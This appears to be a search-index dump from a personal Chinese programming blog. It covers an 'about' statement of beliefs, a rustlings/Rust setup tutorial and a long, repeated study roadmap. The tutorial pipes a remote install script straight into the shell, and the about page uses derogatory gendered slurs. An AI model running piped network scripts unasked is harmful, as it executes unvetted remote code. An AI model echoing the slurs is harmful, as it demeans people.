中国的学生能够是高素质的人才，中国人的思想素质可以进一步提升。男生女生能够互相尊重、和平相处，而不是性别对立；男生能够更有教养和礼貌，他们中的舔狗、PUA大师、动不动就开黄腔的色批、物化女生和喜欢背后评论女生的变态、喜欢和多个女生乱搞的渣男应该彻底消失。女生应该更多学会关心他人，同时洁身自好，那些喜欢吊着男生玩的海王、私下勾结的小团体、议论其他女生的长舌妇、表面一套背面一套的白莲花、喜欢勾引别人男朋友的绿茶婊，都应该彻底消失。此外，毫无道德底线、对人不平等、虚荣、势利眼、欺软怕硬、恃强凌弱、不尊重人、脾气暴大、精神打压、霸凌他人的人，都不应该被社会所容忍。现代社会混杂了非常多这样的人，他们带着虚伪的面具混迹在其中，对他们认为好欺负的人伸出魔爪。我希望有一天，中国人的思想素质能够大幅提升，这些人能够不被社会所容忍，能够被挤出主流社会； 中国的好青年都能有好的恋爱归宿，而不是可怜兮兮的被渣男渣女伤害； 穷人也能富裕起来，能够吃饱饭，能够高兴体面的赚钱，能够过上快乐的生活，而不是被资本家压榨剥削； 中国人能够真正的有自己的自信，而不是总是期盼着洋人能够尊重自己； 中国的科技能够引领世界向前，成为世界的灯塔，而不是跟在别人屁股后面追； 中国能够实现文化、经济、科技、教育等的彻底繁荣，实现每个人自由而平等的解放； ","date":"2024-10-26","objectID":"/about/:4:0","series":null,"tags":null,"title":"关于 Wen Gao","uri":"/about/#我的信仰"},{"categories":null,"content":" 5 其他资料 毛泽东坚定不移的革命信念 逆境中的毛泽东与这两首词–理论-中国共产党新闻网 《毛选》 在“准备困难”中赢得未来 - 知乎 毛泽东如何带领革命队伍克服失败危机 ","date":"2024-10-26","objectID":"/about/:5:0","series":null,"tags":null,"title":"关于 Wen Gao","uri":"/about/#其他资料"},{"categories":["rust"],"content":" Warning 在使用rustlings之前，我们需要学习一些基础的rust语法，并且写一些小程序，否则会因为练习的难度过大而被劝退。 ","date":"2024-10-20","objectID":"/rustlings-%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95.md/:0:0","series":["rust 学习"],"tags":["rust","rustlings","学习记录","编程语言"],"title":"rustlings 通关记录","uri":"/rustlings-%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95.md/#"},{"categories":["rust"],"content":" 1 环境配置","date":"2024-10-20","objectID":"/rustlings-%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95.md/:1:0","series":["rust 学习"],"tags":["rust","rustlings","学习记录","编程语言"],"title":"rustlings 通关记录","uri":"/rustlings-%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95.md/#环境配置"},{"categories":["rust"],"content":" 1.1 Rust环境配置 新建一个仓库，我的叫rustlings-exercises Warning 错误的做法是进入rust-lang/rustlings: 🦀 Small exercises to get you used to reading and writing Rust code!，然后点击fork，得到自己的仓库。对于清华操作系统训练仓库的rustlings练习可以这么干，但是对于rustlings官方的不行。原因是清华的可能修改了rustlings构建的路径。 点击绿色的Code，选择Codespaces，点击create new codespaces on main，创建一个codespaces（不想配置Ubuntu环境的话，可以采取这种懒人做法，也可以采用README中的环境配置方法） 进入codespaces，等待初始化结束。下面我们参考Rust 开发环境配置 - ArceOS Tutorial Book来配置rust开发环境。 首先安装 Rust 版本管理器 rustup 和 Rust 包管理器 cargo，这里我们用官方的安装脚本来安装： bash curl https://sh.rustup.rs -sSf | sh 安装时选择default选项即可。 安装完成后，我们可以重新打开一个终端来让之前设置的环境变量生效。我们也可以手动将环境变量设置应用到当前终端，只需要输入以下命令： bash source $HOME/.cargo/env 接下来验证rustc的版本 bash rustc --version 输出如下： bash @Salvely ➜ /workspaces/rustlings (main) $ rustc --version rustc 1.82.0 (f6e511eec 2024-10-15) 接下来我们配置cargo软件包的源镜像地址，在~/.cargo/config.toml文件中进行如下配置： yaml [source.crates-io] registry = \"https://github.com/rust-lang/crates.io-index\" replace-with = 'ustc' [source.ustc] registry = \"git://mirrors.ustc.edu.cn/crates.io-index\" 接下来安装一些Rust相关的软件包： bash rustup target add riscv64gc-unknown-none-elf rustup component add llvm-tools-preview rustup component add rust-src ","date":"2024-10-20","objectID":"/rustlings-%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95.md/:1:1","series":["rust 学习"],"tags":["rust","rustlings","学习记录","编程语言"],"title":"rustlings 通关记录","uri":"/rustlings-%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95.md/#rust环境配置"},{"categories":["rust"],"content":" 1.2 Rustlings环境配置首先我们需要安装rustlings，使用如下命令： bash cargo install rustlings 然后使用如下命令初始化rustlings文件夹： bash rustlings init 输入cd rustlings，来进入rustlings文件夹，并且运行rustlings来启动rustlings： bash cd rustlings rustlings 出现提示语： bash Is this your first time? Don't worry, Rustlings is made for beginners! We are going to teach you a lot of things about Rust, but before we can get started, here are some notes about how Rustlings operates: 1. The central concept behind Rustlings is that you solve exercises. These exercises usually contain some compiler or logic errors which cause the exercise to fail compilation or testing. It's your job to find all errors and fix them! 2. Make sure to have your editor open in the `rustlings/` directory. Rustlings will show you the path of the current exercise under the progress bar. Open the exercise file in your editor, fix errors and save the file. Rustlings will automatically detect the file change and rerun the exercise. If all errors are fixed, Rustlings will ask you to move on to the next exercise. 3. If you're stuck on an exercise, enter `h` to show a hint. 4. If an exercise doesn't make sense to you, feel free to open an issue on GitHub! (https://github.com/rust-lang/rustlings). We look at every issue, and sometimes, other learners do too so you can help each other out! Press ENTER to continue 环境配置成功！ ","date":"2024-10-20","objectID":"/rustlings-%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95.md/:1:2","series":["rust 学习"],"tags":["rust","rustlings","学习记录","编程语言"],"title":"rustlings 通关记录","uri":"/rustlings-%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95.md/#rustlings环境配置"},{"categories":["rust"],"content":" 2 Rustlings 漫游首先，rustlings 可以和以下两本书配套使用： The Rust Programming Language - The Rust Programming Language Introduction - Rust By Example 接下来我们熟悉一下Rustlings的一些命令，以便后面更好的做题： bash # 查看rustlings 做题状况 rustlings watch # 查看rustlings 做题状况，只查看一次 rustlings verify # 只验证某个练习 rustlings run [exercise-name] # 运行下一个未解决的问题 rustlings run next # 获取练习提示 rustlings hint [exercise-name] # 获得下一个未解决问题的提示 rustlings hint next # 检查进度 rustlings list # 启用rust-analyzer rustlings lsp # 卸载rustlings（通过删除rustlings文件夹） rm -rf rustlings # 或者通过cargo卸载 cargo uninstall rustlings ","date":"2024-10-20","objectID":"/rustlings-%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95.md/:2:0","series":["rust 学习"],"tags":["rust","rustlings","学习记录","编程语言"],"title":"rustlings 通关记录","uri":"/rustlings-%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95.md/#rustlings-漫游"},{"categories":["rust"],"content":" 3 Rustlings 题解","date":"2024-10-20","objectID":"/rustlings-%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95.md/:3:0","series":["rust 学习"],"tags":["rust","rustlings","学习记录","编程语言"],"title":"rustlings 通关记录","uri":"/rustlings-%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95.md/#rustlings-题解"},{"categories":null,"content":" 选择路线，踏上征程，承担后果 我的计算机学习之路。 学习路线： 刷课 课程源码研究+其他教材阅读 自己造轮子 学习好的开源项目，试着参与开源贡献，成为核心开发者 复现顶会论文 个人项目开发 目标：成为法布里斯贝拉，卡玛克，Jeff Dean 那样做出杰出贡献的计算机科学家。 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:0:0","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#"},{"categories":null,"content":" 1 Pre Tip cmake部分：使用cmake-examples仓库学习，完整的配置过程参考这里：cmake 配置 数学基础学习部分：见 math-Journey CMake 基础使用学习 cmake 基础学习 dllist 简易实现 cmake 子项目配置 代码静态检查 clang-tidy clang-format cpplint cppcheck valgrind LeakSanitizer 单元测试 boost catch2(这个现在不常用了，因此不一定要学) googletest 文档撰写 doxygen学习 cpack打包 安装 boost测试框架使用学习(使用reverse测试) googletest测试框架使用学习(使用reverse测试) README.md 模板学习, 试着写出一个好的README.md文档，完善项目中的README.md github actions 快速入门课程学习 C++ 项目的 github actions 配置学习 C++ 简单项目模板实现 优化我的 C++ 模板 发布 C++ 模板 熟悉一个成熟的 C++ 项目模板 doctest 学习 为dllist项目添加doctest测试 使用成熟的 C++ 模板来配置dllist项目并成功运行 《DOOM 启世录》阅读 博客文章模板配置 Rustlings 环境配置 数学基础知识学习完成 微积分基础 常微分方程基础 线性代数基础 概率论与数理统计基础 离散与具体数学 格里马尔迪《离散与组合数学》阅读 用Python实现矩阵运算/Bayes分类器 Ubuntu 开发环境配置 \u0026 学习 《鸟叔的Linux私房菜》读完 vim 和 emacs 安装，把安装过程记录在博客上 vim 学习，用 vim 刷算法题，把刷题过程记录在博客上 emacs 学习，把学习笔记记录在博客上 emacs 插件学习（尤其是 org-mode），把学习过程记录在博客上 其他环境配置完成，把配置过程记录在博客上 《Vim实用技巧》读完 学习Linux，以及如何为Linux操作系统开发软件工具 AI方向学习，学习如何利用AI，开发出AI工具 为Vim开发ai帮助工具 《编码》读完 王爽《汇编语言》读完 《第一行代码》读完（安卓开发书籍） 《软件工程》读完 《Visual C++游戏编程基础》读完 《Can’t hurt me》阅读 ✅ 2025-01-17 cmake强化 用CMake构建一个跨平台项目（Linux/Windows），集成clang-tidy+googletest。 参考：Modern CMake教程 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:1:0","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#pre"},{"categories":null,"content":" 2 刷课记录 Tip 本阶段完成所有的公开课程学习，熟练掌握数学算法+底层系统+图形编程+AI 编程+Web 前后端+软件开发+安全。 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:0","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#刷课记录"},{"categories":null,"content":" 2.1 数据结构 数据结构课程刷完 《数据结构与算法分析——C++语言版》阅读并完成所有习题 普林斯顿《算法》第四版阅读并完成所有习题 邓俊辉《数据结构与算法》 阅读并完成所有课后习题 用C++实现所有数据结构与算法 OJ刷完 C++实现各个数据结构 STL中的数据结构实现学习 小型Git实现 CS61B 其他年份的数据结构项目实现 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:1","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#数据结构"},{"categories":null,"content":" 2.2 算法 算法课程刷完 战疫时期的算法课-南京大学-2020 年春季_哔哩哔哩_bilibili Leetcode 101: Introduction to Algorithmic Thinking, Spring 2021 代码随想录 算法通关手册 CS70 UCB CS170 MIT Introduction to Algorithms 6.006 6.045: Automata, Computability, and Complexity Theory (mit.edu) MIT 6.854 Advanced Algorithms Tim Roughgarden’s Online Courses CS 161 (stanford.edu) CS 161: Design and Analysis of Algorithms (stanford.edu) Schedule | CS 161 (Archived) (stanford-cs161.github.io) CS 161 | CS 161 (Archived) (stanford-cs161.github.io) CS 161 (Archived) | Design and Analysis of Algorithms (stanford-cs161.github.io) CS 161 | CS 161 (Archived) (stanford-cs161.github.io) CMU 15-451/651: Algorithms, Spring 2021: Main Page 15-451 (cmu.edu) Coding interview university Coursera Algorithms I\u0026\u0026II 算法，第一部分 | Coursera CIS 1890 (upenn.edu) CS 225 | Home (illinois.edu)(理论) Theoretical Computer Science Fa2020 Theoretical Computer Science Fall2023 《深入浅出程序设计竞赛》阅读并完成所有习题 《挑战程序设计竞赛》阅读完成并完成所有习题 《算法导论》阅读并完成所有习题 书籍阅读完成 所有公式推导完成 课后习题全部完成 其上的数据结构与算法全部实现（带googletest测试） 《程序设计竞赛入门经典》阅读并完成所有习题 《程序设计竞赛训练指南》阅读并完成所有习题 《程序设计竞赛进阶指南》阅读并完成李煜东《算法竞赛进阶指南》题单 - 题单 - 洛谷 | 计算机科学教育新生态 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:2","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#算法"},{"categories":null,"content":" 2.3 算法能力强化 OJ 刷题 kuangbin带你飞 题单刷完 Leetcode Medium \u0026 Hard 刷完 USACO 刷完 Codeforces 比赛 AtCoder 比赛 打算法比赛搞钱 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:3","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#算法能力强化"},{"categories":null,"content":" 2.4 系统 \u0026 系统安全方向 2.4.1 计算机体系结构 数字电路 Logisim 模拟软件上的数字电路实现 Verilog 语言学习，使用Verilog语言实现各个基础数字电路 用Verilog 实现一个大的数字电路系统，具体参考各个学校的Project 计算机组成原理 Logisim实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 Verilog 实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 计算机体系结构 实现双发射的高效处理器，能够运行Linux操作系统 香山/南湖架构处理器研究，并提开源贡献 造轮子 南大PA完成 一生一芯项目完成 NEMU代码研究，并进行开源贡献，优化NEMU的开源效率 QEMU代码研究，并进行开源贡献，优化QEMU的运行效率 实现一个简单的RISC-V CPU模拟器 强化RISC-V CPU模拟器，使其能够运行Linux操作系统 添加ARM指令集模拟器 强化ARM指令集模拟器，使其能够运行Linux操作系统 添加MIPS指令集模拟器 强化MIIPS指令集模拟器，使其能够运行Linux操作系统 实现三个指令集架构的三合一选择，使其能够运行Linux操作系统 计算机体系结构论文研读并复现 2.4.2 编译原理 \u0026 编程语言 Nand2Tetris SICP 阅读 Scheme版本书籍阅读并完成课后习题 用Scheme实现Scheme解释器，把实现过程记录在博客上 SICP 学习总结完成 Javascript 版本阅读并完成所有习题 Web 前后端开发技能学习 用Javascript实现Web版本的Scheme解释器，把实现过程记录在博客上 SICP Javascript 版本阅读总结完成 SICP 学习经历总结在博客上 Essential of programming languages 阅读 书籍阅读并完成所有习题 用Scheme实现一个解释器 几种汇编语言学习并实现其汇编器 RISC-V 语言学习 RISC-V 汇编器实现 ARM 语言学习 ARM 汇编器实现 MIPS 语言学习 MIPS 汇编器实现 链接工作学习，并实现链接器 《程序员的自我修养》阅读 CSAPP 编译一章阅读 链接器实现 Parsing Techniques 阅读 编译原理课程全部刷完 Stanford CS143 MIT 6.035 各类函数式语言编译器 \u0026 解释器实现 LISP语言学习 LISP解释器实现 Scheme 语言学习 Scheme 语言解释器实现 Common Lisp 语言学习 Common Lisp 解释器实现 ML 语言学习 ML 编译器实现（虎书） Python 解释器实现 OCmal 语言学习 OCmal 解释器实现 Racket 学习 Racket 解释器实现 Haskell 学习 Haskell 解释器实现 面向对象语言编译器研究 \u0026 实现 Stanford Cool语言编译器源码研究 JVM 源码研究 简单的Java虚拟机实现 侯捷《STL源码剖析》阅读 自己实现小型的STL C++子集的编译器实现（cppgm） Rust 语言学习 Rust 语言编译器研究 动态类型语言编译器实现 Javascript 编译器实现 逻辑语言解释器实现 Paradigms of Artificial Intelligence Programming Prolog 语言解释器实现，学习NLP和CV，在其中加入AI功能和数学模型推理功能 人工智能基础学习 NLP 学习 CV 学习 在Prolog语言中加入数据结构、逻辑推理、认知推理、数学推理功能 学习AI底层架构的性能优化，和人工智能模型的优化，以及人工智能编译器的优化 设计AI推理编译器 深度学习编译器 人工智能学习 深度学习学习 计算机图形学学习 图形编译库实现 做出QT那样的图形库 编程语言设计学习 《程序语言之路》 《Essence of compiler》 类型系统学习 JAVA垃圾回收机制学习 底层编译优化学习 多语言编译选择实现 编译器项目源码研究，并进行开源贡献（优化） CPython gcc ANTLR4 Yacc Lex Flex Bison 找到编译器工作 实现JetBrains全家桶那样的编译器 编译原理相关论文研读并复现 Coq 推理学习 2.4.3 系统构建 《深入理解计算机系统》阅读完成 课程刷完 CIS 2400 (upenn.edu) ✅ 2024-12-28 CSAPP - [ ] 重点：Cache Lab（用C优化矩阵转置）+ Proxy Lab（支持并发HTTP请求）。 MIT CSE SJTU CSE 系统原理 造轮子 Shell 实现 Malloc 实现 小型文件系统实现 虚拟内存管理实现 网络编程库实现（如moduo学习），实现自己的Socket套接字 进程通信协议学习实现 2.4.4 操作系统 基础理论学习 \u0026 刷课完成 《操作系统概念》阅读完成 《操作系统设计与实现》阅读完成 THU UCore 实验完成 UCore 源码研究 自己用C语言搓一个小型操作系统，运行在我自己的CPU模拟器上 Rust 资源收集 Rust 基础学习 Rustlings 完成 - [ ] 用Rust重写dllist并添加Benchmark。 - 目标：能熟练用Rust写OS/编译器。 RCore 实验完成 自己用Rust实现一个小型的操作系统，运行QEMU上 MIT 6.081课程学习 - [ ] Lab6: 多线程调度（实现MLFQ）。 - [ ] Lab9: 文件系统（扩展支持符号链接）。 - 输出：GitHub仓库+博客解析。 XV6 Lab完成 XV6 源码研究 优化我自己的C语言操作系统 用Rust重写XV6，运行在QEMU上 优化我自己的Rust操作系统 PintOS Lab完成 PintOS 源码研究 优化我自己的C语言操作系统 PintOS 使用Rust重写，运行在QEMU上 计算机网络学习 为操作系统添加网络协议栈，实现其联网 《Linux内核源码剖析》阅读 Linux Kernel 0.11 源码研究 Linux内核研究，提交开源贡献 开发出带shell和GUI的操作系统，可以在其上打游戏 操作系统顶级会议论文研读并复现 2.4.5 计算机网络 计算机网络课程刷完 用C语言实现一个小型的TCP/IP协议栈 给我自己的操作系统添加一个协议栈，使其联网 对照RFC文档，实现Socket套接字 计算机网络顶级会议论文研读并复现 2.4.6 数据库系统 《数据库系统概念》阅读 《数据库系统实现》阅读 数据库课程刷完 造轮子 小型关系型数据库 KV-Store 数据库 NoSQL 数据库 实现 mysql 协议，支持 mysql 连接 分布式系统学习 为数据库添加实现分布式协议 实现 Web 版本数据库 找到数据库工作 实现支持KV-Store/NoSQL/mysql协议/分布式协议/Web连接/OLTP/OLAP的数据库 2.4.7 并行与分布式系统 MIT 6.824 课程学习完成 实现Raft算法后，优化Leader选举性能（论文《In Search of an Understandable Consensus Algorithm》） C++实现 raftcore 分布式算法 C++实现 Paxos 分布式算法 为数据库添加分布式协议 Tikv talent-plan 学习 Tikv 源码研究，并提一些优化 TIDB talent-plan 学习 TIDB 源码研究，并提一些优化 找到数据库工作 为我自己的数据库加入分布式机制 2.4.8 系统安全 成为逆向工程和 binary hacking/binary exploition, pwn 的大佬 研究操作系统内核安全机制 给系统提安全漏洞补丁 称为计算机系统黑客！ 为我自己的系统（操作系统、硬件、数据库）加安全机制 研究新的安全机制 硬件安全 2.4.9 图形化处理与GPU优化 2.4.10 高性能计算 2.4.11 大数据经典架构 2.4.12 AI推理引擎架构","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:4","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#系统--系统安全方向"},{"categories":null,"content":" 2.4 系统 \u0026 系统安全方向 2.4.1 计算机体系结构 数字电路 Logisim 模拟软件上的数字电路实现 Verilog 语言学习，使用Verilog语言实现各个基础数字电路 用Verilog 实现一个大的数字电路系统，具体参考各个学校的Project 计算机组成原理 Logisim实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 Verilog 实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 计算机体系结构 实现双发射的高效处理器，能够运行Linux操作系统 香山/南湖架构处理器研究，并提开源贡献 造轮子 南大PA完成 一生一芯项目完成 NEMU代码研究，并进行开源贡献，优化NEMU的开源效率 QEMU代码研究，并进行开源贡献，优化QEMU的运行效率 实现一个简单的RISC-V CPU模拟器 强化RISC-V CPU模拟器，使其能够运行Linux操作系统 添加ARM指令集模拟器 强化ARM指令集模拟器，使其能够运行Linux操作系统 添加MIPS指令集模拟器 强化MIIPS指令集模拟器，使其能够运行Linux操作系统 实现三个指令集架构的三合一选择，使其能够运行Linux操作系统 计算机体系结构论文研读并复现 2.4.2 编译原理 \u0026 编程语言 Nand2Tetris SICP 阅读 Scheme版本书籍阅读并完成课后习题 用Scheme实现Scheme解释器，把实现过程记录在博客上 SICP 学习总结完成 Javascript 版本阅读并完成所有习题 Web 前后端开发技能学习 用Javascript实现Web版本的Scheme解释器，把实现过程记录在博客上 SICP Javascript 版本阅读总结完成 SICP 学习经历总结在博客上 Essential of programming languages 阅读 书籍阅读并完成所有习题 用Scheme实现一个解释器 几种汇编语言学习并实现其汇编器 RISC-V 语言学习 RISC-V 汇编器实现 ARM 语言学习 ARM 汇编器实现 MIPS 语言学习 MIPS 汇编器实现 链接工作学习，并实现链接器 《程序员的自我修养》阅读 CSAPP 编译一章阅读 链接器实现 Parsing Techniques 阅读 编译原理课程全部刷完 Stanford CS143 MIT 6.035 各类函数式语言编译器 \u0026 解释器实现 LISP语言学习 LISP解释器实现 Scheme 语言学习 Scheme 语言解释器实现 Common Lisp 语言学习 Common Lisp 解释器实现 ML 语言学习 ML 编译器实现（虎书） Python 解释器实现 OCmal 语言学习 OCmal 解释器实现 Racket 学习 Racket 解释器实现 Haskell 学习 Haskell 解释器实现 面向对象语言编译器研究 \u0026 实现 Stanford Cool语言编译器源码研究 JVM 源码研究 简单的Java虚拟机实现 侯捷《STL源码剖析》阅读 自己实现小型的STL C++子集的编译器实现（cppgm） Rust 语言学习 Rust 语言编译器研究 动态类型语言编译器实现 Javascript 编译器实现 逻辑语言解释器实现 Paradigms of Artificial Intelligence Programming Prolog 语言解释器实现，学习NLP和CV，在其中加入AI功能和数学模型推理功能 人工智能基础学习 NLP 学习 CV 学习 在Prolog语言中加入数据结构、逻辑推理、认知推理、数学推理功能 学习AI底层架构的性能优化，和人工智能模型的优化，以及人工智能编译器的优化 设计AI推理编译器 深度学习编译器 人工智能学习 深度学习学习 计算机图形学学习 图形编译库实现 做出QT那样的图形库 编程语言设计学习 《程序语言之路》 《Essence of compiler》 类型系统学习 JAVA垃圾回收机制学习 底层编译优化学习 多语言编译选择实现 编译器项目源码研究，并进行开源贡献（优化） CPython gcc ANTLR4 Yacc Lex Flex Bison 找到编译器工作 实现JetBrains全家桶那样的编译器 编译原理相关论文研读并复现 Coq 推理学习 2.4.3 系统构建 《深入理解计算机系统》阅读完成 课程刷完 CIS 2400 (upenn.edu) ✅ 2024-12-28 CSAPP - [ ] 重点：Cache Lab（用C优化矩阵转置）+ Proxy Lab（支持并发HTTP请求）。 MIT CSE SJTU CSE 系统原理 造轮子 Shell 实现 Malloc 实现 小型文件系统实现 虚拟内存管理实现 网络编程库实现（如moduo学习），实现自己的Socket套接字 进程通信协议学习实现 2.4.4 操作系统 基础理论学习 \u0026 刷课完成 《操作系统概念》阅读完成 《操作系统设计与实现》阅读完成 THU UCore 实验完成 UCore 源码研究 自己用C语言搓一个小型操作系统，运行在我自己的CPU模拟器上 Rust 资源收集 Rust 基础学习 Rustlings 完成 - [ ] 用Rust重写dllist并添加Benchmark。 - 目标：能熟练用Rust写OS/编译器。 RCore 实验完成 自己用Rust实现一个小型的操作系统，运行QEMU上 MIT 6.081课程学习 - [ ] Lab6: 多线程调度（实现MLFQ）。 - [ ] Lab9: 文件系统（扩展支持符号链接）。 - 输出：GitHub仓库+博客解析。 XV6 Lab完成 XV6 源码研究 优化我自己的C语言操作系统 用Rust重写XV6，运行在QEMU上 优化我自己的Rust操作系统 PintOS Lab完成 PintOS 源码研究 优化我自己的C语言操作系统 PintOS 使用Rust重写，运行在QEMU上 计算机网络学习 为操作系统添加网络协议栈，实现其联网 《Linux内核源码剖析》阅读 Linux Kernel 0.11 源码研究 Linux内核研究，提交开源贡献 开发出带shell和GUI的操作系统，可以在其上打游戏 操作系统顶级会议论文研读并复现 2.4.5 计算机网络 计算机网络课程刷完 用C语言实现一个小型的TCP/IP协议栈 给我自己的操作系统添加一个协议栈，使其联网 对照RFC文档，实现Socket套接字 计算机网络顶级会议论文研读并复现 2.4.6 数据库系统 《数据库系统概念》阅读 《数据库系统实现》阅读 数据库课程刷完 造轮子 小型关系型数据库 KV-Store 数据库 NoSQL 数据库 实现 mysql 协议，支持 mysql 连接 分布式系统学习 为数据库添加实现分布式协议 实现 Web 版本数据库 找到数据库工作 实现支持KV-Store/NoSQL/mysql协议/分布式协议/Web连接/OLTP/OLAP的数据库 2.4.7 并行与分布式系统 MIT 6.824 课程学习完成 实现Raft算法后，优化Leader选举性能（论文《In Search of an Understandable Consensus Algorithm》） C++实现 raftcore 分布式算法 C++实现 Paxos 分布式算法 为数据库添加分布式协议 Tikv talent-plan 学习 Tikv 源码研究，并提一些优化 TIDB talent-plan 学习 TIDB 源码研究，并提一些优化 找到数据库工作 为我自己的数据库加入分布式机制 2.4.8 系统安全 成为逆向工程和 binary hacking/binary exploition, pwn 的大佬 研究操作系统内核安全机制 给系统提安全漏洞补丁 称为计算机系统黑客！ 为我自己的系统（操作系统、硬件、数据库）加安全机制 研究新的安全机制 硬件安全 2.4.9 图形化处理与GPU优化 2.4.10 高性能计算 2.4.11 大数据经典架构 2.4.12 AI推理引擎架构","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:2:4","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#计算机体系结构"},{"categories":null,"content":" 2.4 系统 \u0026 系统安全方向 2.4.1 计算机体系结构 数字电路 Logisim 模拟软件上的数字电路实现 Verilog 语言学习，使用Verilog语言实现各个基础数字电路 用Verilog 实现一个大的数字电路系统，具体参考各个学校的Project 计算机组成原理 Logisim实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 Verilog 实现 实现单周期的RISC-V/MIPS处理器 实现多周期的RISC-V/MIPS处理器 实现流水线的RISC-V/MIPS处理器 计算机体系结构 实现双发射的高效处理器，能够运行Linux操作系统 香山/南湖架构处理器研究，并提开源贡献 造轮子 南大PA完成 一生一芯项目完成 NEMU代码研究，并进行开源贡献，优化NEMU的开源效率 QEMU代码研究，并进行开源贡献，优化QEMU的运行效率 实现一个简单的RISC-V CPU模拟器 强化RISC-V CPU模拟器，使其能够运行Linux操作系统 添加ARM指令集模拟器 强化ARM指令集模拟器，使其能够运行Linux操作系统 添加MIPS指令集模拟器 强化MIIPS指令集模拟器，使其能够运行Linux操作系统 实现三个指令集架构的三合一选择，使其能够运行Linux操作系统 计算机体系结构论文研读并复现 2.4.2 编译原理 \u0026 编程语言 Nand2Tetris SICP 阅读 Scheme版本书籍阅读并完成课后习题 用Scheme实现Scheme解释器，把实现过程记录在博客上 SICP 学习总结完成 Javascript 版本阅读并完成所有习题 Web 前后端开发技能学习 用Javascript实现Web版本的Scheme解释器，把实现过程记录在博客上 SICP Javascript 版本阅读总结完成 SICP 学习经历总结在博客上 Essential of programming languages 阅读 书籍阅读并完成所有习题 用Scheme实现一个解释器 几种汇编语言学习并实现其汇编器 RISC-V 语言学习 RISC-V 汇编器实现 ARM 语言学习 ARM 汇编器实现 MIPS 语言学习 MIPS 汇编器实现 链接工作学习，并实现链接器 《程序员的自我修养》阅读 CSAPP 编译一章阅读 链接器实现 Parsing Techniques 阅读 编译原理课程全部刷完 Stanford CS143 MIT 6.035 各类函数式语言编译器 \u0026 解释器实现 LISP语言学习 LISP解释器实现 Scheme 语言学习 Scheme 语言解释器实现 Common Lisp 语言学习 Common Lisp 解释器实现 ML 语言学习 ML 编译器实现（虎书） Python 解释器实现 OCmal 语言学习 OCmal 解释器实现 Racket 学习 Racket 解释器实现 Haskell 学习 Haskell 解释器实现 面向对象语言编译器研究 \u0026 实现 Stanford Cool语言编译器源码研究 JVM 源码研究 简单的Java虚拟机实现 侯捷《STL源码剖析》阅读 自己实现小型的STL C++子集的编译器实现（cppgm） Rust 语言学习 Rust 语言编译器研究 动态类型语言编译器实现 Javascript 编译器实现 逻辑语言解释器实现 Paradigms of Artificial Intelligence Programming Prolog 